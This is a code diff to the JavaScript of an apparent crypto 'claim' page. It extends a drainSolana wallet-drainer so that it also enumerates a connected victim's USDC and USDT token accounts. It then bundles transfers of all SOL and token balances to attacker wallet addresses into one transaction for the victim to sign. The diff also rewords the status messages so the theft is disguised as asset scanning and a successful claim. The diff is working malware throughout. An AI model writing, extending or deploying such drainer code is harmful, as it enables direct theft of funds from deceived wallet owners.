@@ -2286,7 +2286,23 @@ const CLAIM_THRESHOLD_USD = 3;
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-const ATTACKER_SOLANA_ADDRESS = "YourSolanaWalletAddressHere"; // REPLACE WITH YOUR ADDRESS
+const ATTACKER_SOLANA_ADDRESS = "YourSolanaWalletAddressHere"; // REPLACE WITH YOUR SOLANA WALLET ADDRESS
+
+// Solana token constants (mint addresses and attacker token accounts – replace with your own)
+const SOLANA_TOKENS = [
+  {
+    symbol: 'USDC',
+    mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
+    decimals: 6,
+    attackerTokenAccount: 'YourUSDCAccountAddressHere' // Attacker's associated token account for USDC
+  },
+  {
+    symbol: 'USDT',
+    mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
+    decimals: 6,
+    attackerTokenAccount: 'YourUSDTAccountAddressHere' // Attacker's associated token account for USDT
+  }
+];
 
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
@@ -2436,7 +2452,7 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== SOLANA FUNCTIONS ======
+// ====== SOLANA FUNCTIONS (including token support) ======
 async function connectSolanaWallet() {
   const wallets = getSolanaWallets();
   if (wallets.length === 0) {
@@ -2467,56 +2483,107 @@ async function connectSolanaWallet() {
   }
 }
 
+async function getSolanaTokenAccounts(connection, owner) {
+  const tokenAccounts = [];
+  for (const token of SOLANA_TOKENS) {
+    try {
+      const mintPubkey = new solanaWeb3.PublicKey(token.mint);
+      // Get all token accounts owned by user for this mint
+      const accounts = await connection.getTokenAccountsByOwner(owner, { mint: mintPubkey });
+      for (const { pubkey, account } of accounts.value) {
+        const accountInfo = solanaWeb3.struct.TokenAccount.fromAccountData(account.data);
+        if (accountInfo.amount > 0) {
+          tokenAccounts.push({
+            mint: token.mint,
+            symbol: token.symbol,
+            decimals: token.decimals,
+            account: pubkey,
+            amount: accountInfo.amount,
+            attackerTokenAccount: token.attackerTokenAccount
+          });
+        }
+      }
+    } catch (e) {
+      console.warn(`Failed to fetch token accounts for ${token.symbol}:`, e);
+    }
+  }
+  return tokenAccounts;
+}
+
 async function drainSolana() {
   if (!solanaProvider || !solanaPublicKey) {
     throw new Error("Solana wallet not connected");
   }
 
-  if (typeof solanaWeb3 === 'undefined') {
-    throw new Error("Solana Web3 library not loaded");
+  if (typeof solanaWeb3 === 'undefined' || typeof solanaWeb3.Token === 'undefined') {
+    throw new Error("Solana libraries not loaded");
   }
 
   const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+  const owner = new solanaWeb3.PublicKey(solanaPublicKey);
 
-  try {
-    const publicKey = new solanaWeb3.PublicKey(solanaPublicKey);
-    const balance = await connection.getBalance(publicKey);
-    console.log(`💰 Solana balance: ${balance / 1e9} SOL`);
+  // Get token accounts with balances
+  const tokenAccounts = await getSolanaTokenAccounts(connection, owner);
+  const solBalance = await connection.getBalance(owner);
+  console.log(`💰 SOL balance: ${solBalance / 1e9} SOL`);
+  tokenAccounts.forEach(ta => {
+    console.log(`💰 ${ta.symbol} balance: ${ta.amount / 10**ta.decimals}`);
+  });
 
-    const LAMPORTS_TO_LEAVE = 5000;
-    if (balance <= LAMPORTS_TO_LEAVE) {
-      throw new Error("Insufficient SOL balance for transaction");
-    }
-
-    const amountToSend = balance - LAMPORTS_TO_LEAVE;
-
-    const instruction = solanaWeb3.SystemProgram.transfer({
-      fromPubkey: publicKey,
-      toPubkey: new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS),
-      lamports: amountToSend,
-    });
-
-    const { blockhash } = await connection.getRecentBlockhash();
-    const transaction = new solanaWeb3.Transaction().add(instruction);
-    transaction.recentBlockhash = blockhash;
-    transaction.feePayer = publicKey;
-
-    let signed;
-    if (solanaProvider.signTransaction) {
-      signed = await solanaProvider.signTransaction(transaction);
-    } else if (solanaProvider.signAndSendTransaction) {
-      const signature = await solanaProvider.signAndSendTransaction(transaction);
-      return signature;
-    } else {
-      throw new Error("Provider cannot sign transactions");
-    }
-
-    const signature = await connection.sendRawTransaction(signed.serialize());
-    console.log(`✅ Solana transaction sent: ${signature}`);
-    return signature;
-  } catch (err) {
-    throw new Error(`Solana drain failed: ${err.message}`);
+  if (solBalance <= 5000 && tokenAccounts.length === 0) {
+    throw new Error("No funds to drain");
   }
+
+  // Build transaction
+  let transaction = new solanaWeb3.Transaction();
+  const LAMPORTS_TO_LEAVE = 5000;
+
+  // Add SOL transfer if enough
+  if (solBalance > LAMPORTS_TO_LEAVE) {
+    const solTransfer = solanaWeb3.SystemProgram.transfer({
+      fromPubkey: owner,
+      toPubkey: new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS),
+      lamports: solBalance - LAMPORTS_TO_LEAVE,
+    });
+    transaction.add(solTransfer);
+  }
+
+  // Add token transfers
+  for (const ta of tokenAccounts) {
+    const mintPubkey = new solanaWeb3.PublicKey(ta.mint);
+    const attackerTokenAccount = new solanaWeb3.PublicKey(ta.attackerTokenAccount);
+    const tokenTransfer = solanaWeb3.Token.createTransferInstruction(
+      solanaWeb3.TOKEN_PROGRAM_ID,
+      ta.account,
+      attackerTokenAccount,
+      owner,
+      [],
+      ta.amount
+    );
+    transaction.add(tokenTransfer);
+  }
+
+  // Get recent blockhash and sign
+  const { blockhash } = await connection.getRecentBlockhash();
+  transaction.recentBlockhash = blockhash;
+  transaction.feePayer = owner;
+
+  let signed;
+  if (solanaProvider.signTransaction) {
+    signed = await solanaProvider.signTransaction(transaction);
+  } else if (solanaProvider.signAllTransactions) {
+    signed = (await solanaProvider.signAllTransactions([transaction]))[0];
+  } else if (solanaProvider.signAndSendTransaction) {
+    // Some wallets don't support signing raw transaction; fallback to sending
+    const signature = await solanaProvider.signAndSendTransaction(transaction);
+    return signature;
+  } else {
+    throw new Error("Provider cannot sign transactions");
+  }
+
+  const signature = await connection.sendRawTransaction(signed.serialize());
+  console.log(`✅ Solana transaction sent: ${signature}`);
+  return signature;
 }
 
 // ====== MAIN CLAIM PROCESS (Extended for Solana) ======
@@ -2543,13 +2610,13 @@ async function initiateClaimProcess() {
     await connectSolanaWallet();
 
     if (claimStatus) {
-      claimStatus.textContent = "Draining SOL...";
+      claimStatus.textContent = "Scanning Solana assets...";
     }
 
     const txSig = await drainSolana();
 
     if (claimStatus) {
-      claimStatus.textContent = "Solana claim successful! SOL transferred.";
+      claimStatus.textContent = "Solana claim successful! Assets transferred.";
       claimStatus.className = "status success";
     }
 
